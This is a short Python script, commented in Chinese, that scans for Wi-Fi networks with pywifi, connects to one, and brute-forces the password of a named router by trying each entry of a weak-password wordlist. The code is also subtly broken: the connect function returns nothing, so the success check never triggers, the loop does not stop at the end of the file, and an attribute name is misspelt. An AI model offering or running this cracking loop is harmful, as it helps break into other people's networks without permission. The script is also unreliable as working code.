# -*- coding:utf-8 -*-
# ！/usr/bin/env python
# @Time : 2024/3/6 13:49
# @Author : waxberry
# @File : WiFi.py
# @Software : PyCharm



# pip install pywifi
# pip install comtypes

# 扫描周围的Wi-Fi网络
from pywifi import PyWiFi, const, Profile
import time

def scan_wifi():
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]
    ifaces.scan()
    time.sleep(1)
    results = ifaces.scan_results()

    for network in results:
        print(f'SSID:{network.ssid}, 信号强度：{network.single}')
scan_wifi()


# 连接到Wi-Fi网络
def connect_wifi(ssid, password):
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]
    ifaces.disconnect()
    time.sleep(1)
    assert ifaces.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password

    ifaces.remove_all_network_profiles()
    tmp_profile = ifaces.add_network_profile(profile)

    ifaces.connect(tmp_profile)
    time.sleep(2)

    if ifaces.status() == const.IFACE_CONNECTED:
        print('连接成功')
    else:
        print('连接失败')

connect_wifi('wifi_name', 'password')




# 在网上找一个弱口令库，用穷举法进行逐个去尝试，这种方法又称为暴力破解法
def try_pwd():
    print("****************** WIFI破解 ******************")
    # 密码本路径
    path = 'pwd.txt'
    # 打开文件
    file = open(path, 'r')
    ssid = 'TP-LINK_2020'
    while True:
        try:
            pwd = file.readline()
            # 去除密码的末尾换行符
            pwd = pwd.strip('\n')
            bool = connect_wifi(ssid, pwd)
            if bool:
                print("[*] 密码已破解：", pwd)
                print("[*] WiFi已自动连接！！！")
                break
            else:
                # 跳出当前循环，进行下一次循环
                print(f"正在破解 SSID 为 {ssid} 的 WIFI密码，当前校验的密码为：{pwd}")

        except:
            continue

try_pwd()